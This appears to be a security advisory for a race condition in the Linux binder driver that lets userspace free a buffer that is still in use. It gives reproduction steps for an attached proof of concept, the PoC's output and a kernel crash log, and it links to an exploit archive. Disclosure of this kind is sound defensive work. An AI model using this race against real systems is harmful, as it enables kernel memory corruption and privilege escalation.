@@ -1,0 +1,164 @@
+The following bug report solely looks at the situation on the upstream master
+branch; while from a cursory look, at least the wahoo kernel also looks
+affected, I have only properly tested this on upstream master.
+
+The binder driver permits userspace to free buffers in the kernel-managed shared
+memory region by using the BC_FREE_BUFFER command. This command implements the
+following restrictions:
+
+ - binder_alloc_prepare_to_free_locked() verifies that the pointer points to a
+   buffer
+ - binder_alloc_prepare_to_free_locked() verifies that the ->free_in_progress
+   flag is not yet set, and sets it
+ - binder_thread_write() verifies that the ->allow_user_free flag is set
+
+The first two of these checks happen with alloc->mutex held.
+
+
+The ->free_in_progress flag can be set in the following places:
+
+ - new buffers are allocated with kzalloc() and therefore have the flag set to 0
+ - binder_alloc_prepare_to_free_locked() sets it to 1 when starting to free a
+   buffer
+ - binder_alloc_new_buf_locked() sets it to 0 when a buffer is allocated
+
+This means that a buffer coming from binder_alloc_new_buf() always has this flag
+clear.
+
+
+The ->allow_user_free flag can be set in the following places:
+ - new buffers are allocated with kzalloc() and therefore have the flag set to 0
+ - binder_transaction() sets it to 0 after allocating a buffer with
+   binder_alloc_new_buf()
+ - binder_thread_read() sets it to 1 after an allocated buffer has been filled
+   with data for userspace
+
+This means that a buffer coming from binder_alloc_new_buf() may have the flag
+either clear or set: If the buffer is new, the bit is 0; but if the buffer has
+previously been used, the bit remains 1 from the previous use.
+
+
+Therefore, it can be possible for userspace to free a buffer coming from
+binder_alloc_new_buf(). Directly after the call to binder_alloc_new_buf(),
+->allow_user_free is set to zero; but there is a small race window in which an
+attacker can use BC_FREE_BUFFER to free the buffer.
+
+
+
+I am attaching a proof of concept for the upstream git master kernel running on
+a normal desktop system.
+Unpack the attached binder_race_freebuf.tar.
+Patch the kernel with 0001-binder-race-helper.patch to widen the race window and
+add some debug logging. Build it and boot into it.
+Use ./compile.sh to build the PoC, then run ./poc as root.
+
+The output should look like this:
+===============
+# ./poc
+### FIRST PING
+0000: 00 . 00 . 00 . 00 .
+BR_NOOP:
+BR_TRANSACTION:
+  target 0000000000000000  cookie 0000000000000000  code 00000001  flags 00000010
+  pid     1192  uid        0  data 4  offs 0
+0000: 00 . 00 . 00 . 00 .
+got transaction!
+binder_send_reply(status=0)
+offsets=0x7ffc68d94ec0, offsets_size=0
+BR_NOOP:
+BR_TRANSACTION_COMPLETE:
+BR_NOOP:
+BR_TRANSACTION_COMPLETE:
+BR_REPLY:
+  target 0000000000000000  cookie 0000000000000000  code 00000000  flags 00000000
+  pid        0  uid        0  data 4  offs 0
+0000: 00 . 00 . 00 . 00 .
+binder_done: freeing buffer
+binder_done: free done
+### SECOND PING
+0000: 00 . 00 . 00 . 00 .
+### ATTEMPTING FREE IN RACE WINDOW
+### END OF FREE IN RACE WINDOW, FLUSHING PAGE
+### END OF PAGE FLUSH
+===============
+
+You should see something like this in dmesg (if you have
+/sys/module/binder/parameters/debug_mask set to 16383):
+===============
+[   71.555144] binder: binder_open: 1191:1191
+[   71.557091] binder: binder_mmap: 1191 7f273d896000-7f273dc96000 (4096 K) vma 71 pagep 8000000000000025
+[   71.560020] binder: 1191:1191 node 1 u0000000000000000 c0000000000000000 created
+[   71.563526] binder: 1191:1191 write 4 at 00007ffc68d95020, read 0 at 0000000000000000
+[   71.566453] binder: 1191:1191 BC_ENTER_LOOPER
+[   71.568390] binder: 1191:1191 wrote 4 of 4, read return 0 of 0
+[   71.571268] binder: 1191:1191 write 0 at 0000000000000000, read 128 at 00007ffc68d95020
+[   72.555736] binder: binder_open: 1192:1192
+[   72.558848] binder: binder_mmap: 1192 7f273d896000-7f273dc96000 (4096 K) vma 71 pagep 8000000000000025
+[   72.564619] binder: 1192:1192 write 68 at 00007ffc68d93fa0, read 128 at 00007ffc68d93f20
+[   72.568033] binder: 1192:1192 BC_TRANSACTION 2 -> 1191 - node 1, data 00007ffc68d94070-00007ffc68d94050 size 4-0-0
+[   72.571666] binder: [1192] ENTERING SLEEP BEFORE ZEROING allow_user_free (data{user}=0x00007f273d896000 allow_user_free=0 free_in_progress=0 free=0)
+[   82.692703] binder: [1192] LEAVING SLEEP BEFORE ZEROING allow_user_free (allow_user_free=0 free_in_progress=0 free=0)
+[   82.699956] binder: 1191:1191 BR_TRANSACTION 2 1192:1192, cmd -2143260158 size 4-0 ptr 00007f273d896000-00007f273d896008
+[   82.707859] binder: 1191:1191 wrote 0 of 0, read return 72 of 128
+[   82.712176] binder: 1191:1191 write 88 at 00007ffc68d94da0, read 0 at 0000000000000000
+[   82.715038] binder: 1191:1191 BC_FREE_BUFFER u00007f273d896000 found buffer 2 for active transaction
+[   82.717791] binder: 1191 buffer release 2, size 4-0, failed at 000000004a5bea11
+[   82.720813] binder: 1191:1191 BC_REPLY 3 -> 1192:1192, data 00007ffc68d94ee0-00007ffc68d94ec0 size 4-0-0
+[   82.723643] binder: [1191] ENTERING SLEEP BEFORE ZEROING allow_user_free (data{user}=0x00007f273d896000 allow_user_free=0 free_in_progress=0 free=0)
+[   92.932760] binder: [1191] LEAVING SLEEP BEFORE ZEROING allow_user_free (allow_user_free=0 free_in_progress=0 free=0)
+[   92.939182] binder: 1191:1191 wrote 88 of 88, read return 0 of 0
+[   92.939230] binder: 1192:1192 BR_TRANSACTION_COMPLETE
+[   92.943073] binder: 1191:1191 write 0 at 0000000000000000, read 128 at 00007ffc68d95020
+[   92.943077] binder: 1191:1191 BR_TRANSACTION_COMPLETE
+[   92.943088] binder: 1191:1191 wrote 0 of 0, read return 8 of 128
+[   92.946332] binder: 1192:1192 BR_REPLY 3 0:0, cmd -2143260157 size 4-0 ptr 00007f273d896000-00007f273d896008
+[   92.949858] binder: 1191:1191 write 0 at 0000000000000000, read 128 at 00007ffc68d95020
+[   92.952057] binder: 1192:1192 wrote 68 of 68, read return 76 of 128
+[   92.963782] binder: 1192:1192 write 12 at 00007ffc68d94024, read 0 at 0000000000000000
+[   92.966693] binder: 1192:1192 BC_FREE_BUFFER u00007f273d896000 found buffer 3 for finished transaction
+[   92.970073] binder: 1192 buffer release 3, size 4-0, failed at 000000004a5bea11
+[   92.972570] binder: 1192:1192 wrote 12 of 12, read return 0 of 0
+[   92.975094] binder: 1192:1192 write 68 at 00007ffc68d93fa0, read 128 at 00007ffc68d93f20
+[   92.978318] binder: 1192:1192 BC_TRANSACTION 4 -> 1191 - node 1, data 00007ffc68d94070-00007ffc68d94050 size 4-0-0
+[   92.981400] binder: [1192] ENTERING SLEEP BEFORE ZEROING allow_user_free (data{user}=0x00007f273d896000 allow_user_free=1 free_in_progress=0 free=0)
+[   93.975357] binder: 1191:1191 write 12 at 00007ffc68d94a60, read 0 at 0000000000000000
+[   93.980201] binder: 1191:1191 BC_FREE_BUFFER u00007f273d896000 found buffer 2 for finished transaction
+[   93.986293] binder: 1191 buffer release 2, size 4-0, failed at 000000004a5bea11
+[   93.989411] binder: 1191:1191 wrote 12 of 12, read return 0 of 0
+[   94.123942] poc (1191): drop_caches: 2
+[   94.124975] binder: 1191:1191 write 0 at 0000000000000000, read 128 at 00007ffc68d95020
+[  103.172683] binder: [1192] LEAVING SLEEP BEFORE ZEROING allow_user_free (allow_user_free=1 free_in_progress=1 free=1)
+[  103.179477] BUG: pagefault on kernel address 0xffffc90001656000 in non-whitelisted uaccess
+[  103.184390] BUG: unable to handle kernel paging request at ffffc90001656000
+[  103.186619] PGD 1ead31067 P4D 1ead31067 PUD 1eaeaa067 PMD 1e26bb067 PTE 0
+[  103.188645] Oops: 0002 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN
+[  103.190386] CPU: 1 PID: 1192 Comm: poc Not tainted 4.20.0-rc3+ #221
+[  103.192262] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[  103.195468] RIP: 0010:copy_user_generic_unrolled+0xa0/0xc0
+[...]
+[  103.224384] Call Trace:
+[  103.225124]  _copy_from_user+0x5e/0x90
+[  103.226231]  binder_transaction+0xe2c/0x3a70
+[...]
+[  103.245031]  binder_thread_write+0x788/0x1b10
+[...]
+[  103.262718]  binder_ioctl+0x916/0xe80
+[...]
+[  103.273723]  do_vfs_ioctl+0x134/0x8f0
+[...]
+[  103.279071]  ksys_ioctl+0x70/0x80
+[  103.279968]  __x64_sys_ioctl+0x3d/0x50
+[  103.280998]  do_syscall_64+0x73/0x160
+[  103.281989]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[...]
+[  103.302367] ---[ end trace aa878f351ca08969 ]---
+[  103.303412] RIP: 0010:copy_user_generic_unrolled+0xa0/0xc0
+[...]
+[  103.327111] binder: 1192 close vm area 7f273d896000-7f273dc96000 (4096 K) vma 18020051 pagep 8000000000000025
+[  103.329459] binder: binder_flush: 1192 woke 0 threads
+[  103.329497] binder: binder_deferred_release: 1192 threads 1, nodes 0 (ref 0), refs 0, active transactions 0
+===============
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46503.zip
